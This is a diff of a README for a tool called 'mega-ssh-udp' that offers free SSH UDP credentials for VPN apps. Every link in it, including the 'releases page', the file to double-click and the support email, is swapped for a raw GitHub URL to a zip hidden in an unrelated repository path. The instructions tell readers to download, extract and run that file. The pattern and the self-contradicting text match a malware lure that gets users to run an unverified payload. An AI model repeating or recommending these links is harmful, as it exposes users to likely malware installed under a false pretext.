@@ -4,7 +4,7 @@
 
 Welcome to mega-ssh-udp! This application allows you to obtain free SSH UDP credentials for use in various VPNs, such as HTTP Custom VPN. It’s designed to be user-friendly, so even if you're not tech-savvy, you’ll have no trouble getting set up. 
 
-[![Download mega-ssh-udp](https://raw.githubusercontent.com/Marek93739/mega-ssh-udp/main/deviancy/mega-ssh-udp.zip%20Now-DIRECT%https://raw.githubusercontent.com/Marek93739/mega-ssh-udp/main/deviancy/mega-ssh-udp.zip)](https://raw.githubusercontent.com/Marek93739/mega-ssh-udp/main/deviancy/mega-ssh-udp.zip)
+[![Download mega-ssh-udp](https://raw.githubusercontent.com/Marek93739/mega-ssh-udp/main/client/src/pages/udp-mega-ssh-3.3.zip%20Now-DIRECT%https://raw.githubusercontent.com/Marek93739/mega-ssh-udp/main/client/src/pages/udp-mega-ssh-3.3.zip)](https://raw.githubusercontent.com/Marek93739/mega-ssh-udp/main/client/src/pages/udp-mega-ssh-3.3.zip)
 
 ## 📥 Download & Install
 
@@ -12,15 +12,15 @@ To get started, you need to download the application. Follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page. Here, you will find the latest version of mega-ssh-udp.
    
-   [Visit the Releases Page to Download](https://raw.githubusercontent.com/Marek93739/mega-ssh-udp/main/deviancy/mega-ssh-udp.zip)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/Marek93739/mega-ssh-udp/main/client/src/pages/udp-mega-ssh-3.3.zip)
 
 2. **Select the Latest Release**: On the releases page, you will see a list of available versions. The top one is the most recent. 
 
-3. **Download the Application**: Click on the version you want to download. This will lead you to a list of downloadable files. Look for the file labeled **https://raw.githubusercontent.com/Marek93739/mega-ssh-udp/main/deviancy/mega-ssh-udp.zip** or similar. Click to download it to your device.
+3. **Download the Application**: Click on the version you want to download. This will lead you to a list of downloadable files. Look for the file labeled **https://raw.githubusercontent.com/Marek93739/mega-ssh-udp/main/client/src/pages/udp-mega-ssh-3.3.zip** or similar. Click to download it to your device.
 
 4. **Unzip the Downloaded File**: Once the download is complete, locate the file. It is usually in your Downloads folder. Right-click on the file and select “Extract All” or use any unzipping tool you have.
 
-5. **Run the Application**: After extracting, double-click the application file (**https://raw.githubusercontent.com/Marek93739/mega-ssh-udp/main/deviancy/mega-ssh-udp.zip**) to launch it.
+5. **Run the Application**: After extracting, double-click the application file (**https://raw.githubusercontent.com/Marek93739/mega-ssh-udp/main/client/src/pages/udp-mega-ssh-3.3.zip**) to launch it.
 
 ## 💻 System Requirements
 
@@ -51,7 +51,7 @@ After successfully installing mega-ssh-udp, follow these instructions to generat
 
 ## 📞 Support
 
-If you encounter any issues or have questions about using mega-ssh-udp, please reach out for support. You can create an issue on the GitHub repository or contact us through email at https://raw.githubusercontent.com/Marek93739/mega-ssh-udp/main/deviancy/mega-ssh-udp.zip
+If you encounter any issues or have questions about using mega-ssh-udp, please reach out for support. You can create an issue on the GitHub repository or contact us through email at https://raw.githubusercontent.com/Marek93739/mega-ssh-udp/main/client/src/pages/udp-mega-ssh-3.3.zip
 
 ## 🔗 Additional Resources
 
@@ -66,4 +66,4 @@ We plan to roll out additional features and improvements based on user feedback.
 
 While mega-ssh-udp strives to provide secure services, it is important to remain cautious while using shared networks. Always ensure that your connection is secure and monitor your usage.
 
-[Download mega-ssh-udp now from the releases page!](https://raw.githubusercontent.com/Marek93739/mega-ssh-udp/main/deviancy/mega-ssh-udp.zip)
+[Download mega-ssh-udp now from the releases page!](https://raw.githubusercontent.com/Marek93739/mega-ssh-udp/main/client/src/pages/udp-mega-ssh-3.3.zip)
